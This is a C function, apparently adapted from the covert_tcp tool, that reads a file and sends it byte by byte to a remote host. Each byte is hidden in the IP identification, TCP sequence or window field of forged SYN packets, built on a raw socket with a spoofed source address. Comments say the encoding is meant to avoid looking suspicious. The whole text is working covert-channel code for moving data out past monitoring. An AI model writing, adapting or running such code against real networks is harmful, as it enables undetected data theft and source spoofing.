


void clientHandler(unsigned int source_addr, unsigned int dest_addr, unsigned 
short source_port, unsigned short dest_port, char *filename, int server, int ipid
, int seq, int ack) 
{
   struct send_tcp
   {
      struct iphdr ip;
      struct tcphdr tcp;
   } send_tcp;

   struct recv_tcp
   {
      struct iphdr ip;
      struct tcphdr tcp;
      char buffer[10000];
   } recv_pkt;

   /* From synhose.c by knight */
   struct pseudo_header
   {
      unsigned int source_address;
      unsigned int dest_address;
      unsigned char placeholder;
      unsigned char protocol;
      unsigned short tcp_length;
      struct tcphdr tcp;
   } pseudo_header;

   int ch;
   int send_socket;
   int recv_socket;
   struct sockaddr_in sin;
   FILE *input;
   FILE *output;

/* Initialize RNG for future use */
srand((getpid())*(dest_port)); 

/**********************/
/* Client code        */
/**********************/
/* are we the client? */
if(server==0)
{
if((input=fopen(filename,"rb"))== NULL)
 {
 printf("I cannot open the file %s for reading\n",filename);
 exit(1);
 }
else while((ch=fgetc(input)) !=EOF)
 {

/* Delay loop. This really slows things down, but is necessary to ensure */
/* semi-reliable transport of messages over the Internet and will not flood */
/* slow network connections */
/* A better should probably be developed */
sleep(1);

/* NOTE: I am not using the proper byte order functions to initialize */
/* some of these values (htons(), htonl(), etc.) and this will certainly */
/* cause problems on other architectures. I didn't like doing a direct */
/* translation of ASCII into the variables because this looked really */
/* suspicious seeing packets with sequence numbers of 0-255 all the time */
/* so I just read them in raw and let the function mangle them to fit its */
/* needs... CHR */

   /* Make the IP header with our forged information */
   send_tcp.ip.ihl = 5;
   send_tcp.ip.version = 4;
   send_tcp.ip.tos = 0;
   send_tcp.ip.tot_len = htons(40);
/* if we are NOT doing IP ID header encoding, randomize the value */
/* of the IP identification field */
if (ipid == 0)
   send_tcp.ip.id =(int)(255.0*rand()/(RAND_MAX+1.0)); 
else /* otherwise we "encode" it with our cheesy algorithm */
   send_tcp.ip.id =ch;

   send_tcp.ip.frag_off = 0;
   send_tcp.ip.ttl = 64; 
   send_tcp.ip.protocol = IPPROTO_TCP;
   send_tcp.ip.check = 0;
   send_tcp.ip.saddr = source_addr;
   send_tcp.ip.daddr = dest_addr;

/* begin forged TCP header */
if(source_port == 0) /* if the didn't supply a source port, we make one */
   send_tcp.tcp.source = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
else /* otherwise use the one given */
   send_tcp.tcp.source = htons(source_port);

if(seq==0) /* if we are not encoding the value into the seq number */
   send_tcp.tcp.seq = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
else /* otherwise we'll hide the data using our cheesy algorithm one more time. */
   send_tcp.tcp.seq = ch;

   /* forge destination port */
   send_tcp.tcp.dest = htons(dest_port);
  
   /* the rest of the flags */
   /* NOTE: Other covert channels can use the following flags to encode data a BIT */
   /* at a time. A good example would be the use of the PSH flag setting to either */
   /* on or off and having the remote side decode the bytes accordingly... CHR */
   send_tcp.tcp.ack_seq = 0;
   send_tcp.tcp.res1 = 0;
   send_tcp.tcp.doff = 5;
   send_tcp.tcp.fin = 0;
   send_tcp.tcp.syn = 1;
   send_tcp.tcp.rst = 0;
   send_tcp.tcp.psh = 0;
   send_tcp.tcp.ack = 0;
   send_tcp.tcp.urg = 0;
   send_tcp.tcp.res2 = 0;
   send_tcp.tcp.window = ch;//htons(512);
   send_tcp.tcp.check = 0;
   send_tcp.tcp.urg_ptr = 0;
   
   /* Drop our forged data into the socket struct */
   sin.sin_family = AF_INET;
   sin.sin_port = send_tcp.tcp.source;
   sin.sin_addr.s_addr = send_tcp.ip.daddr;   
   
   /* Now open the raw socket for sending */
   send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   if(send_socket < 0)
   {
      perror("send socket cannot be open. Are you root?");
      exit(1);
   }

      /* Make IP header checksum */
      send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
      /* Final preparation of the full header */

      /* From synhose.c by knight */
      pseudo_header.source_address = send_tcp.ip.saddr;
      pseudo_header.dest_address = send_tcp.ip.daddr;
      pseudo_header.placeholder = 0;
      pseudo_header.protocol = IPPROTO_TCP;
      pseudo_header.tcp_length = htons(20);

      bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
      /* Final checksum on the entire package */
      send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);
      /* Away we go.... */
      sendto(send_socket, &send_tcp, 40, 0, (struct sockaddr *)&sin, sizeof(sin));
      printf("Sending Data: %c\n",ch);

  close(send_socket);
 } /* end while(fgetc()) loop */
fclose(input);
}/* end if(server == 0) loop */




} /* end forgepacket() function */

